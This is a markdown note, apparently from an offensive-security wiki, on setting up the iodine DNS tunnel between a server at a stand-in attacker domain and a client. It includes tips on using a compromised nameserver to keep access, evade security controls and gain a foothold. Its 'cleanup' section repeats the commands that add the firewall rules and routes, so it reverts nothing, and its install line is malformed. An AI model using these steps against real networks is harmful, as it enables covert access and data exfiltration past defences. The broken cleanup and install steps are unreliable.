# Iodine

## Setup

### Package Manager

Install it according to your package manager.

```
$ sudo apt install -y iodine

$ sudo dnf install -y iodine

$ sudo pacman -S --noconfirm iodine
```

### Universal Install

```
$ git clone https://github.com/yarrick/iodine && cd iodine \
sudo make install
```

## Server

> [!TIP] Hijack DNS Nameserver (OPSEC Consideration)
> Compromised DNS namserver can be used to maintain access and evade security endpoints due to it's legitimacy.

Once you've setup a domain nameserver for your own server. Perform a quick DNS network diagnostic to see if the subdomain is present.

```
$ dig NS <VPS_IP>
```

Once it's confirmed create a new DNS network tunnel.

```
# iodined -f -c -P <password> <new_tunnel_IP> subdomain.domain.tld
```

Here's an example.

```
# iodined -f -c -P password123 10.0.0.1 dnstun.attacker.com
```

You'll see a new network interface has been created.

```
$ ip address show dns0
```

> [!NOTE]
> This step isn't necessary unless your own VPS provider requires you to use firewall rules to open ports.

Create a firewall rule to route the DNS traffic.

```
# echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i eth0 -o dns0 -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i dns0 -o eth0 -j ACCEPT
```

Run the packet analyzer to listen for any incoming connections.

> [!NOTE]
> This step is also not necessary since it can confirm that it is being tunneled.
> > [!TIP]
> > However, it can be used to monitor incoming traffic when deploying an automated script from the client-side.

```
# tcpdump -i eth0 udp port 53
```

## Client

> [!TIP] Establishing/Maintaining Access
> An automated script can be used to deploy with multiple subdomains of DNS nameservers to maintain access or establishing the initial foothold.

```
# iodine -f -P <password> subdomain.domain.tld
```

You'll see a new network interface has been created.

```
$ ip address show dns0
```

> [!NOTE]
> This step isn't necessary unless the client-side is experiencing problems with the networking route that may require manual configuration.

Create a new network route.

```
# ip route add 0.0.0.0/0 gw <new_tunnel_IP>
ip route add default via <new_tunnel_IP>
```

Here's an example.

```
# ip route add 0.0.0.0/0 gw 10.0.0.1
ip route add default via 10.0.0.1
```

## Cleanup and Revert Settings

### Remove Firewall Rules

TODO: Add a clean up section

```
# echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i eth0 -o dns0 -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i dns0 -o eth0 -j ACCEPT
```

### Remove Route Network

```
# ip route add <VPS_IP> gw <new_tunnel_IP>
ip route add default via <new_tunnel_IP>
```

---
## References

### Backlinks

- [[TCPDump]]

### Source Repositories

- [yarrick: `iodine`](https://github.com/yarrick/iodine)

### Iodine

- [iodine](https://code.kryo.se/iodine/)

### David Hamann

- [David Hamann: Tunneling network traffic over DNS with Iodine and a SSH SOCKS proxy](https://davidhamann.de/2019/05/12/tunnel-traffic-over-dns-ssh/)

### HaXeZ

- [HaXeZ: Firewall Evasion with DNS Tunneling](https://haxez.org/firewall-evasion-with-dns-tunneling/)